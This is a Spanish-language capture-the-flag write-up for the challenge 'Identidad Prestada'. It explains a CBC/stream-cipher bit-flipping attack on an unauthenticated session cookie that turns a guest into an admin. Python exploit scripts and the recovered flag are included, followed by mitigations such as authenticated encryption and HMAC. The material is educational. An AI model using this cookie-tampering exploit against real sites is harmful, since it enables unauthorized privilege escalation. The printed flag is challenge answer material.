# CTF 8: Identidad Prestada - Writeup

## Información del Reto

| Campo | Valor |
|-------|-------|
| **Nombre** | Identidad Prestada |
| **Puntos** | 80 |
| **URL** | https://darkgreen-heron-900493.hostingersite.com/ctf8/ |
| **Formato Flag** | `UNI_FI33_CCC{XXXXXXX}` |
| **Hint** | "Con Flipping bits" |

## Descripción Original

> Eres bienvenido, pero no esperado.
> La puerta te deja mirar, no entrar.
> Si descubres cómo te nombran, podrás convertirte en alguien con permiso.

## Análisis Inicial

### Reconocimiento de la Página

Al acceder a la URL, encontramos una página de "Secure Bank Corp" con el mensaje:

```
Bienvenido, usuario invitado. Acceso restringido.
```

### Inspección de Headers y Cookies

Utilizando `curl -v` para inspeccionar la respuesta HTTP:

```bash
curl -v -c - "https://darkgreen-heron-900493.hostingersite.com/ctf8/"
```

**Hallazgos importantes:**

1. **Cookie de sesión**: El servidor establece una cookie llamada `bank_session`
2. **Valor de la cookie**: String hexadecimal de 96 caracteres (48 bytes)
3. **Ejemplo**: `SECRET_REDACTED_BY_ANTIGRAVITYSECRET_REDACTED_BY_ANTIGRAVITY26c889571fd8d6d3`

## Identificación de la Vulnerabilidad

### Pistas del Reto

| Pista | Interpretación |
|-------|----------------|
| "Cómo te nombran" | Identidad almacenada en cookie |
| "Convertirte en alguien con permiso" | Cambiar rol de invitado a admin |
| "Flipping bits" | Ataque de Bit-Flipping |

### Tipo de Ataque: Bit-Flipping

El **Bit-Flipping Attack** explota vulnerabilidades en cifrados de flujo (stream ciphers) o modo CBC donde:

- El cifrado usa operación XOR: `Ciphertext = Plaintext XOR Key`
- Modificar bits en el ciphertext modifica los mismos bits en el plaintext descifrado
- No se requiere conocer la clave de cifrado

**Fórmula del ataque:**
```
Si: C = P XOR K
Entonces: C' = C XOR (P XOR P')
Resulta: P' = C' XOR K
```

## Explotación

### Paso 1: Obtener Cookie Fresca

```python
import requests

url = "https://darkgreen-heron-900493.hostingersite.com/ctf8/"
session = requests.Session()
r = session.get(url)
cookie = session.cookies.get('bank_session')
```

### Paso 2: Función de Bit-Flipping

```python
def xor_at_position(cookie_hex, pos, original, target):
    cookie_bytes = bytearray.fromhex(cookie_hex)
    for i, (o, t) in enumerate(zip(original.encode(), target.encode())):
        if pos + i < len(cookie_bytes):
            cookie_bytes[pos + i] ^= (o ^ t)
    return cookie_bytes.hex()
```

### Paso 3: Descubrimiento del Formato JSON

Al probar modificaciones aleatorias, el servidor respondió:

```
Error: La sesión está corrupta. El JSON no es válido.
```

Esto reveló que la cookie contiene **datos JSON cifrados**.

### Paso 4: Identificar el Campo a Modificar

Probamos diferentes transformaciones:

| Original | Target | Resultado |
|----------|--------|-----------|
| `guest` | `admin` | JSON corrupto |
| `invitado` | `administ` | JSON corrupto |
| `user` | `root` | JSON corrupto |
| `0` | `1` | **¡FLAG!** |

### Paso 5: Ejecución Exitosa

```python
# Cambiar "0" a "1" en posición 9
modified = xor_at_position(cookie, 9, "0", "1")
r2 = requests.get(url, cookies={"bank_session": modified})
print(r2.text)
```

**Resultado:**
```html
<div class="alert alert-success">
    <h2>¡SISTEMA VULNERADO!</h2>
    Flag: <strong>UNI_FI33_CCC{CBC_B1t_Fl1pp1ng_1s_M4g1c}</strong>
</div>
```

## Script Completo de Explotación

```python
#!/usr/bin/env python3
import requests

url = "https://darkgreen-heron-900493.hostingersite.com/ctf8/"

# Obtener cookie de sesión
session = requests.Session()
session.get(url)
cookie = session.cookies.get('bank_session')

# Función de bit-flipping
def xor_at_position(cookie_hex, pos, original, target):
    cookie_bytes = bytearray.fromhex(cookie_hex)
    for i, (o, t) in enumerate(zip(original.encode(), target.encode())):
        cookie_bytes[pos + i] ^= (o ^ t)
    return cookie_bytes.hex()

# Explotar: cambiar 0 -> 1 en posición 9
modified_cookie = xor_at_position(cookie, 9, "0", "1")

# Enviar cookie modificada
response = requests.get(url, cookies={"bank_session": modified_cookie})
print(response.text)
```

## Estructura Probable del JSON

Basándonos en el ataque exitoso, el JSON descifrado probablemente tenía esta estructura:

```json
{"admin":0, ...}
```

Al hacer bit-flip de `0` → `1`:

```json
{"admin":1, ...}
```

## Flag

```
UNI_FI33_CCC{CBC_B1t_Fl1pp1ng_1s_M4g1c}
```

## Lecciones Aprendidas

### Vulnerabilidades Explotadas

1. **Cifrado sin autenticación**: El cifrado XOR/stream cipher no incluye MAC (Message Authentication Code)
2. **Datos sensibles en cookie**: El rol del usuario se almacena en la cookie del cliente
3. **Sin validación de integridad**: El servidor no verifica si la cookie fue manipulada

### Mitigaciones Recomendadas

| Vulnerabilidad | Solución |
|----------------|----------|
| Cifrado sin MAC | Usar cifrado autenticado (AES-GCM, ChaCha20-Poly1305) |
| Datos en cliente | Almacenar sesión en servidor, solo ID en cookie |
| Sin integridad | Agregar HMAC a los datos cifrados |

### Ejemplo de Implementación Segura

```php
// En lugar de solo cifrar:
$cookie = encrypt($json);

// Usar cifrado autenticado:
$cookie = encrypt_authenticated($json, $key);
// O agregar HMAC:
$cookie = encrypt($json) . '.' . hmac($encrypted, $key);
```

## Referencias

- [Bit-Flipping Attack - Wikipedia](https://en.wikipedia.org/wiki/Bit-flipping_attack)
- [CBC Bit-Flipping Attack - OWASP](https://owasp.org/www-community/attacks/Bit_flipping_attack)
- [Authenticated Encryption - NIST](https://csrc.nist.gov/projects/block-cipher-techniques/bcm/modes-of-operation)
